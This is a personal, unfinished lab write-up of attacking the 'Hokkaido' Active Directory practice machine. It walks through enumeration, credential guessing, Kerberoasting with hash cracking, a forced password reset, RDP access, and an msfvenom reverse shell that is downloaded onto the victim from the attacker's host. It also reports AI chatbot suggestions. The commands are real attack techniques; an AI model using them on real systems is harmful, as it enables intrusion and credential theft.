# Report - Hokkaido

- Author: Henry Post
- Target: Hokkaido
- Target IP: 192.168.53.40
- Attacker IP: 192.168.49.53
- Date: 05/13 /2026

## Executive Summary



### Recommendations


## Resources

- https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491


## Recon

I ran an nmap scan that enumerated their ports:

     nmap -sS -sV -p- hokkaido

```txt

???(kali?kali)-[~]
??$ nmap -sS -sV -p- hokkaido
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-13 23:58 +0000
Stats: 0:02:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 39.07% done; ETC: 00:03 (0:03:24 remaining)
Nmap scan report for hokkaido (192.168.53.40)
Host is up (0.00035s latency).
Not shown: 65502 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 00:03:57Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hokkaido-aerospace.com, Site: Default-First-Site-Name)

```

Pretty chonky scan. Not sure where to start. Let's try IIS...
Nope. Default page. Let's try gobuster.

```
gobuster dir -u http://hokkaido:80/ -w /usr/share/wordlists/dirb/common.txt
```

Womp womp. `http://hokkaido/aspnet_client/` is the only find.
Let's try `dirb`.

```sh
dirb http://hokkaido/
```

Nothing.

We must need to attack SMB in some way. Let's try to list shares...

```sh
smbclient -L //hokkaido -N
# nope

smbclient -L //192.168.53.40 -N
```

Let's try `nbtscan`.

```sh
nbtscan 192.168.53.40
# nothing
```

Let's try `netexec`...

```sh
netexec smb hokkaido

<<EOF
???(kali?kali)-[~]
??$ netexec smb hokkaido
SMB         192.168.53.40   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
EOF
```

We might be able to connect further with `netexec`...

Let's ask `z.ai`.

```sh
netexec smb 192.168.53.40 --users
# no users

rpcclient -U "" -N 192.168.53.40
enumdomains # NT_STATUS_ACCESS_DENIED
enumdomusers # NT_STATUS_ACCESS_DENIED
querydominfo # NT_STATUS_ACCESS_DENIED

ldapsearch -x -H ldap://192.168.53.40 -s base namingcontexts

<<EOF
???(kali?kali)-[~]
??$ ldapsearch -x -H ldap://192.168.53.40 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=hokkaido-aerospace,DC=com
namingcontexts: CN=Configuration,DC=hokkaido-aerospace,DC=com
namingcontexts: CN=Schema,CN=Configuration,DC=hokkaido-aerospace,DC=com
namingcontexts: DC=DomainDnsZones,DC=hokkaido-aerospace,DC=com
namingcontexts: DC=ForestDnsZones,DC=hokkaido-aerospace,DC=com

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

EOF

ldapsearch -x -H ldap://192.168.53.40 -b "DC=hokkaido-aerospace,DC=com" "(objectClass=user)" sAMAccountName
# fails, 000004DC: LdapErr: DSID-0C090CF8


```

We can check for a DNS Zone Transfer.

```sh
dig axfr @192.168.53.40 hokkaido-aerospace.com
# fails
```

We can test to see if we can access MSSQL.

```sh
impacket-mssqlclient -windows-auth hokkaido-aerospace.com/guest:guest@192.168.53.40
# fails: [-] ERROR(DC\SQLEXPRESS): Line 1: Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication.

```

No usernames yet.

We decide to run a script scan with `nmap`...

```txt
???(kali?kali)-[~]
??$ nmap -sC hokkaido
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-14 00:20 +0000
Nmap scan report for hokkaido (192.168.53.40)
Host is up (0.00036s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-05-13T23:56:37
|_Not valid after:  2027-05-13T23:56:37
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hokkaido-aerospace.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:dc.hokkaido-aerospace.com
| Not valid before: 2026-05-13T23:56:37

```

It doesn't really tell us anything we don't already know...

Sent the above to `z.ai`, it suggested I use a Kerberos brute-force tool.

```sh
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 ./kerbrute
chmod +x ./kerbrute

./kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.53.40 /usr/share/seclists/Usernames/cirt-default-usernames.txt

<<EOF
2026/05/14 00:24:50 >  [+] VALID USERNAME:       ADMINISTRATOR@hokkaido-aerospace.com
2026/05/14 00:24:50 >  [+] VALID USERNAME:       Administrator@hokkaido-aerospace.com
2026/05/14 00:24:50 >  [+] VALID USERNAME:       INFO@hokkaido-aerospace.com
2026/05/14 00:24:50 >  [+] VALID USERNAME:       administrator@hokkaido-aerospace.com
EOF
```

Cool beans. We found two real users.

```txt
Administrator
INFO
```

Asking our shiny chrome overlord `z.ai` for more advice, it suggests AS-REP Roasting.

```sh
echo "administrator" > users.txt
echo "info" >> users.txt

impacket-GetNPUsers hokkaido-aerospace.com/ -dc-ip 192.168.53.40 -usersfile users.txt
# rip
<<EOF
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User info doesn't have UF_DONT_REQUIRE_PREAUTH set
EOF
```

Okay. So.

```sh
netexec smb 192.168.53.40 -u users.txt -p 'info'

<<EOF
???(kali?kali)-[~]
??$ netexec smb 192.168.53.40 -u users.txt -p 'info'

SMB         192.168.53.40   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.53.40   445    DC               [-] hokkaido-aerospace.com\administrator:info STATUS_LOGON_FAILURE
SMB         192.168.53.40   445    DC               [+] hokkaido-aerospace.com\info:info 

EOF
```

It's just `info:info`. Sweet!

We get MySQL shell.

```sh
impacket-mssqlclient hokkaido-aerospace.com/info:info@192.168.53.40 -windows-auth
```

```sql
SELECT IS_SRVROLEMEMBER('sysadmin'); --no

/*
SQL (HAERO\info  guest@master)> EXEC sp_configure 'show advanced options', 1;
ERROR(DC\SQLEXPRESS): Line 105: User does not have permission to perform this action.
*/

--we cannot use xp_cmdshell sadly
```

Let's try enumerating shares...

```sh
smbclient //192.168.53.40/C$ -U 'info%info' # fails
smbclient //192.168.53.40/ADMIN$ -U 'info%info' # fails

smbclient -L //192.168.53.40 -U 'info%info'

<<EOF
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        homes           Disk      user homes
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        UpdateServicesPackages Disk      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
        WsusContent     Disk      A network share to be used by Local Publishing to place published content on this WSUS system.
        WSUSTemp        Disk      A network share used by Local Publishing from a Remote WSUS Console Instance.
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.53.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

EOF
```

Neat. Let's spider the shares with `smbmap`.

```sh
# note: IP changed to 192.168.57.40
smbmap -H 192.168.57.40 -u info -p info #-R is not a flag

<<EOF
[+] IP: 192.168.57.40:445       Name: 192.168.57.40             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        homes                                                   READ, WRITE     user homes
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        UpdateServicesPackages                                  READ ONLY       A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
        WsusContent                                             READ ONLY       A network share to be used by Local Publishing to place published content on this WSUS system.
        WSUSTemp                                                NO ACCESS       A network share used by Local Publishing from a Remote WSUS Console Instance.

EOF

# check SYSVOL
smbclient //192.168.57.40/SYSVOL -U 'info%info'

<<EOF
smb: \hokkaido-aerospace.com\Policies\> dir
  .                                   D        0  Sat Nov 25 13:11:13 2023
  ..                                  D        0  Sat Nov 25 13:17:33 2023
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Nov 25 13:11:13 2023
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Nov 25 13:11:13 2023

                7699711 blocks of size 4096. 1918210 blocks available

EOF

# looks like we have some password_reset.txt file
# getting file \hokkaido-aerospace.com\scripts\temp\password_reset.txt of size 27 as password_reset.txt (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
# Start123!

# sadly, SYSVOL showed no groups.xml files.
```

We stole a cred, `Start123!`... I wonder if we can login as Administrator now.

```sh
smbclient //192.168.57.40/SYSVOL -U 'Administrator%Start123!' # fails

impacket-mssqlclient 'hokkaido-aerospace.com/Administrator:Start123!@192.168.57.40' -windows-auth # fails

smbclient //192.168.57.40/homes -U 'info%info' # waste of time

smbclient "//192.168.57.40/IPC$" -U 'info%info' # empty
```

Let's see if we can find any other users.

```sh
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
mv kerbrute_linux_amd64 ./kerbrute
chmod +x ./kerbrute

./kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.57.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

<<EOF

info
administrator
discovery
maintenance

EOF
```

Neat, we found a few more. Time to brute-force SMB login.

```sh
echo "info" > users.txt
echo "administrator" >> users.txt
echo "discovery" >> users.txt
echo "maintenance" >> users.txt

netexec smb 192.168.57.40 -u users.txt -p 'Start123!'

<<EOF
SMB         192.168.57.40   445    DC               [+] hokkaido-aerospace.com\discovery:Start123! 
EOF
```

Looks like `discovery:Start123!` is a legit login.

Let's see if it can login to the SQL server.

```sh
impacket-mssqlclient 'hokkaido-aerospace.com/discovery:Start123!@192.168.57.40' -windows-auth
# login works

SELECT IS_SRVROLEMEMBER('sysadmin'); # nope. can't use xp_cmdshell

EXEC sp_configure 'show advanced options', 1; RECONFIGURE; # fails

SELECT * FROM fn_my_permissions(NULL, 'SERVER');
<<EOF

entity_name   subentity_name   permission_name     
-----------   --------------   -----------------   
server                         CONNECT SQL         
server                         VIEW ANY DATABASE   

EOF
```

Let's try a DC Sync attack.

```sh
nxc smb 192.168.57.40 -u discovery -p 'Start123!' --ntds # fails.
```

Alright. I'm stuck.

https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491

Okay. So apparently we need to kerberoast, after stealing more credentials from the database.

```sh
impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@192.168.55.40 -dc-ip 192.168.55.40 -windows-auth
```

And run SQL:

```sql
SELECT name FROM master..sysdatabases;

-- hrappdb seems interesting.

use hrappdb;
-- no perms

SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

-- apparently we need to impersonate `hrappdb-reader`...

EXECUTE AS LOGIN = 'hrappdb-reader';
use hrappdb;
-- success.


SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
-- hmmm, 'sysauth' table...

select * from sysauth;
-- id   name               password           
-- --   ----------------   ----------------   
--  0   b'hrapp-service'   b'Untimed$Runny'   

-- great, we stole another password.

```

Now to see what attack paths we can get with BloodHound.

```sh
# get data for bloodhound
bloodhound-python -u "hrapp-service" -p 'Untimed$Runny' -d hokkaido-aerospace.com -c all --zip -ns 192.168.55.40

# then, load it into bloodhound
# (new terminal)
bloodhound-setup
bloodhound-start

# I had to do some fiddling to get BloodHound to work...
sudo runuser -u postgres -- psql -c 'ALTER DATABASE postgres REFRESH COLLATION VERSION; ALTER DATABASE template1 REFRESH COLLATION VERSION;'

sudo -u postgres psql
ALTER DATABASE bloodhound REFRESH COLLATION VERSION;
bloodhound-setup

# end of fiddling.
```


![](Pasted%20image%2020260605173510.png)

It looks like `hrapp-service` has GenericWrite to `hazel.green`...

Our guide says to kerberoast just `hazel.green`:

```sh
git clone https://github.com/ShutdownRepo/targetedKerberoast

cd targetedKerberoast

python targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.55.40
```

We steal 3 hashes, `maintenance`, `discovery`, and `Hazel.Green`.

Let's crack Hazel's password!

```sh
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
hashcat -m 13100 roast-hazel.txt /usr/share/wordlists/rockyou.txt --force --show

# haze1988
```

Great, our cred is `Hazel.Green:haze1988`.

![](Pasted%20image%2020260605174915.png)

`Molly.Smith` is a Tier 1 admin.

Let's change her password.

```sh
rpcclient -N 192.168.55.40 -U 'Hazel.Green' --password="haze1988"
setuserinfo2 MOLLY.SMITH 23 'Password123!'
# fails with result was NT_STATUS_ACCESS_DENIED
```

Okay. I asked z.ai.

Looking in BloodHound, the route from Hazel.Green to Molly.Smith is:

`Hazel.Green MemberOf Tier2-Admins ForceChangePassword Molly.Smith`

From `z.ai`:

The reason your `rpcclient` attempt failed earlier is likely due to using the wrong **Command Level**.

In `rpcclient`, `setuserinfo2` uses different levels for different password operations:

- **Level 23**: `SAMR_USER_CHANGE_PASSWORD` (Requires the Old Password).
- **Level 24**: `SAMR_USER_FORCE_PASSWORD_CHANGE` (Does **not** require the Old Password; used for Admin/Delegated resets).

Since you have the `ForceChangePassword` right (but not the old password for Molly), you need to use **Level 24**.

Okay. Let's try it out.

```sh
rpcclient -U 'Hazel.Green%haze1988' 192.168.53.40

setuserinfo2 Molly.Smith 24 'Password123!'
# it works!
```

Great. Next steps... RDP!

```sh
xfreerdp /cert:ignore /u:molly.smith /p:'Password123!' /v:192.168.53.40 +clipboard
```

![](Pasted%20image%2020260605212429.png)

We have RDP access.

We get local blood.

![](Pasted%20image%2020260605212527.png)

We have these permissions:

```txt
C:\Users\molly.smith>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Let's check `whoami /groups`.

```txt
C:\Users\molly.smith>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549                                  Group used for deny only
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
HAERO\Tier1-Admins                         Group            S-1-5-21-3227296914-974780204-1325941497-1141 Mandatory group, Enabled by default, Enabled group
HAERO\it                                   Group            S-1-5-21-3227296914-974780204-1325941497-1105 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
HAERO\WSUS Administrators                  Alias            S-1-5-21-3227296914-974780204-1325941497-1103 Mandatory group, Enabled by default, Enabled group, Local Group
HAERO\WSUS Reporters                       Alias            S-1-5-21-3227296914-974780204-1325941497-1104 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

```

z.ai sez:

1. - Members of the local `WSUS Administrators` group have the ability to manage the Windows Server Update Services (WSUS) instance.
    - This typically grants **write access** to the `SUSDB` SQL database and/or the ability to manipulate update packages.

```sh
impacket-mssqlclient 'hokkaido-aerospace.com/molly.smith:Password123!@192.168.55.40' -windows-auth

SELECT name FROM master..sysdatabases;
USE SUSDB;
# ERROR(DC\SQLEXPRESS): Line 1: Database 'SUSDB' does not exist. Make sure that the name is entered correctly.

```

### The New Plan: Exploit WSUS via the API (RDP)

Okay. I'm listening, z.ai...

> Since you are a member of **`WSUS Administrators`** and have **RDP access**, you must interact with WSUS using the local API rather than the database directly.

> You need to use a tool like **SharpWSUS** (a .NET executable) from within the Windows session.


https://github.com/windowsoffender/compiled_binaries

```sh

git clone https://github.com/windowsoffender/compiled_binaries

cd compiled_binaries

ip a | grep 192 # 192.168.49.55

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.55 LPORT=4444 -f exe -o shell.exe

sudo python -m http.server 80
```

In separate terminal on attacker... to catch rev shell.

```sh
msfconsole

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.49.55
set LPORT 4444
exploit
```

On victim...

```powershell
Invoke-WebRequest -Uri "http://192.168.49.55/SharpWSUS.exe" -OutFile "C:\Users\molly.smith\Documents\SharpWSUS.exe"

Invoke-WebRequest -Uri "http://192.168.49.55/shell.exe" -OutFile "C:\Users\molly.smith\Documents\shell.exe"

C:\Users\molly.smith\Documents\SharpWSUS.exe config
```

Dang it. Windows Defender blocked it. And we can't unblock it... Let's read the lab desc one more time.

> In this lab, learners exploit a Windows Active Directory environment through multiple steps, combining enumeration, Kerberoasting, credential discovery, and privilege escalation. Initial access is obtained via SMB and Kerberos enumeration, leading to domain compromise through Shadow Credentials and exploitation of privileged accounts.


Okay. Back to asking z.ai.

### Path A: Shadow Credentials (RBCD) - Recommended

Check your BloodHound graph for the following edge: **Does `hrapp-service` (or `Hazel.Green`) have `GenericWrite` on the Domain Controller computer object (`DC$`)?**

Let's see.

```sh
impacket-addcomputer -dc-ip 192.168.53.40 -domain hokkaido-aerospace.com -computer-name 'EVILPC$' -computer-pass 'Password123!' 'hokkaido-aerospace.com/hrapp-service:Untimed$Runny'

# [*] Successfully added machine account EVILPC$ with password Password123!.

```

> Excellent! You now have a valid machine account (`EVILPC$`) in the domain.

> Now we need to delegate permissions. We are going to tell the Domain Controller (`DC$`) that it "trusts" `EVILPC$` to act on its behalf. To do this, the account we use (`hrapp-service` or `Hazel.Green`) must have **`GenericWrite`** permissions on the `DC$` object.

> Let's try with `hrapp-service` first (since we used it to create the computer). If that fails, we will try `Hazel.Green`.

Okay.

```sh
pip install pywhisker

pywhisker -d hokkaido-aerospace.com -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.53.40 --target 'DC$' --delegate 'EVILPC$' --action write
```

(fails)

Asking z.ai again,

### Step 1: Add a Shadow Credential to DC$ Run the command with `--action add`. This will generate a certificate file (`.pfx`) for you.

```sh
pywhisker -d hokkaido-aerospace.com -u 'Hazel.Green' -p 'haze1988' --dc-ip 192.168.53.40 --target 'DC$' --action add
# fails

```

Now z.ai says:

> Since Shadow Credentials failed due to "Insufficient Access Rights" on `DC$`, we need to try the **RBCD (Resource-Based Constrained Delegation)** attack using the `EVILPC$` account you created earlier. This modifies a different attribute (`msDS-AllowedToActOnBehalfOfOtherIdentity`) which `Hazel.Green` (Tier 2 Admin) likely has permission to write to.

```sh
wget https://raw.githubusercontent.com/NotMedic/AD-attacks/master/rbcd.py

# 404. gee, thanks AI...
```

Okay. I'm getting frustrated. I'm taking a break from this lab.

## Root access


